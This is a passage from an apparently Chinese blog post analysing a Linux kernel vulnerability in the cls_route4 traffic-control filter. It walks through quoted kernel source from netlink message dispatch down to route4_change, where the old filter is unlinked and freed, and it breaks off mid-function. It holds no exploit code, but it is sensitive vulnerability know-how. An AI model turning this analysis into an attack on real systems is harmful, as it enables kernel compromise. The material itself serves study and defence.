*extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">	rtnl_doit_func doit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> kind;</span><br><span class="line">	<span class="keyword">int</span> family;</span><br><span class="line">	<span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">	type = nlh-&gt;nlmsg_type;</span><br><span class="line">	<span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line">	<span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">	kind = type&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kind != <span class="number">2</span> &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	<span class="keyword">if</span> (kind == <span class="number">2</span> &amp;&amp; nlh-&gt;nlmsg_flags&amp;NLM_F_DUMP) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">		rtnl_dumpit_func dumpit;</span><br><span class="line">		u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		link = rtnl_get_link(family, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">			family = PF_UNSPEC;</span><br><span class="line">			link = rtnl_get_link(family, type);</span><br><span class="line">			<span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line">				<span class="keyword">goto</span> err_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		owner = link-&gt;owner;</span><br><span class="line">		dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">			min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">			err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">		rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">		rtnl = net-&gt;rtnl;</span><br><span class="line">		<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">				.dump		= dumpit,</span><br><span class="line">				.min_dump_alloc	= min_dump_alloc,</span><br><span class="line">				.<span class="keyword">module</span>		= owner,</span><br><span class="line">			&#125;;</span><br><span class="line">			err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line">			<span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment">			 * module if dump is still in progress.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			module_put(owner);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">		family = PF_UNSPEC;</span><br><span class="line">		link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	owner = link-&gt;owner;</span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">		err = -EPROTONOSUPPORT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags = link-&gt;flags;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">		doit = link-&gt;doit;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">if</span> (doit)</span><br><span class="line">			err = doit(skb, nlh, extack);</span><br><span class="line">		module_put(owner);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">		err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">	rtnl_unlock();</span><br><span class="line"></span><br><span class="line">	module_put(owner);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面继续分析<code>tc_new_tfilter()</code>函数,这个函数代码较多就不摆出来了，主要看一下关键代码</p>
<p>在看关键代码之前首先要搞清楚一个数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">	__u16           nla_len;</span><br><span class="line">	__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个是<code>netlink</code>一般的数据段格式，图示如下。</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297396Tqc4.jpg" alt="T5"></p>
<p>一个<code>nlattr</code>+<code>value</code>就相当于一个数据段的字段了。其中<code>length</code>是nlattr+value的总长度。<code>tc_new_tfilter()</code>函数首先初始化了变量<code>struct nlattr *tca[TCA_MAX + 1]</code>,他是一个结构体指针数组。数组中的每个指针都指向了一个用户进程传进来的字段的首地址。</p>
<p>获取每一个字段之后，后面就是对字段的解析了，首先是从字段中获取过滤器的名字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后是根据chainidx(可控)获取chain,然后根据chain获取一个tp(struct tcf_proto),</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">			       prio, prio_allocate);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">		err = PTR_ERR(tp);</span><br><span class="line">		<span class="keyword">goto</span> errout_locked;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>如果tp不存在还会根据过滤器名称<code>name</code>调用<code>tcf_proto_create(</code>创建一个新的<code>tp</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">					  rtnl_held, extack);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">			err = PTR_ERR(tp_new);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">					  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">					  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">					  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!tp)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">	tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">		err = PTR_ERR(tp-&gt;ops);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">	tp-&gt;protocol = protocol;</span><br><span class="line">	tp-&gt;prio = prio;</span><br><span class="line">	tp-&gt;chain = chain;</span><br><span class="line">	spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">	refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	kfree(tp);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>tcf_proto_create()</code>中会根据<code>name</code>即<code>kind</code>调用函数<code>tcf_proto_lookup_ops()</code>获得对应的<code>ops</code>,内核本来就有一些<code>ops</code>，查找对应ops的原理就是对比<code>kind==ops-&gt;kind</code>，如果等于那就返回这个ops的首地址。</p>
<p>比如如果传入的<code>kind=&quot;route&quot;</code>就会返回这样的<code>ops</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">	.kind		=	<span class="string">&quot;route&quot;</span>,</span><br><span class="line">	.classify	=	route4_classify,</span><br><span class="line">	.init		=	route4_init,</span><br><span class="line">	.destroy	=	route4_destroy,</span><br><span class="line">	.get		=	route4_get,</span><br><span class="line">	.change		=	route4_change,</span><br><span class="line">	.<span class="keyword">delete</span>		=	route4_delete,</span><br><span class="line">	.walk		=	route4_walk,</span><br><span class="line">	.dump		=	route4_dump,</span><br><span class="line">	.bind_class	=	route4_bind_class,</span><br><span class="line">	.owner		=	THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>然后初始化<code>tp</code>的一些字段。</p>
<p>最后调用<code>tp-&gt;ops-&gt;init</code>即<code>route4_init</code>函数，这个函数创建了一个<code>rout4_head</code>结构体用于存放过滤器对应的哈希值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">	head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后返回到<code>tc_new_tfilter</code>函数中，把新创建并且初始化的<code>tp</code>插入到<code>chain</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">						rtnl_held);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">			err = PTR_ERR(tp);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用<code>tp-&gt;ops-&gt;get</code>即<code>route4_get()</code></p>
<p>根据handle从route4_head链表中获取对应的route4_filter。如果为空且<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>存在或者不为空但<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>不存在则调用<code>tp-&gt;ops-&gt;change</code>即<code>rout4_change</code>创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">			      flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">		tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">			       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">		tfilter_put(tp, fh);</span><br><span class="line">		<span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line">		<span class="keyword">if</span> (q)</span><br><span class="line">			q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>rout4_change()</code>就是漏洞产生的模块。</p>
<p>硬着头皮看了半个晚上的代码终于大概搞懂了相关的结构体的关系以及漏洞原因。</p>
<p>首先是有一个结构体<code>chain</code>,这个结构体记录了一个<code>tp</code>的链表，然后<code>tc_new_tfilter()</code>函数根据用户传进来的一些参数确定一个<code>tp</code>如果找不到这个<code>tp</code>那就创建一个新的<code>tp</code>，关键的是还会创建一个新的<code>route4_head</code>,记录在这个新<code>tp</code>的字段里，这个<code>route4_head</code>就是一个哈希桶，主要记录<code>route4_filter</code>结构体，<code>route4_head</code>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> &#123;</span></span><br><span class="line">	<span class="comment">/* 16 FROM buckets + 16 IIF buckets + 1 wildcard bucket */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">ht</span>[16 + 16 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以清晰的看见就是一个哈希桶，<code>tp-&gt;ops-&gt;get()</code>是会根据用户传入的<code>handle</code>找对应<code>route4_filter</code>，找到的话返回，没找到返回<code>null</code>。</p>
<p>接着调用<code>tp-&gt;ops-&gt;change()</code>函数，把<code>get()</code>函数找到的旧的过滤器也传入,<code>change</code>首先是会把新的过滤器插入到哈希桶即<code>route4_head</code>中，接着判断旧的过滤器<code>fold</code>是否存在，如果存在的话先把她从哈希桶中移出来，然后把他<code>kfree</code>掉。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg;</span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">	     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">	     fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) 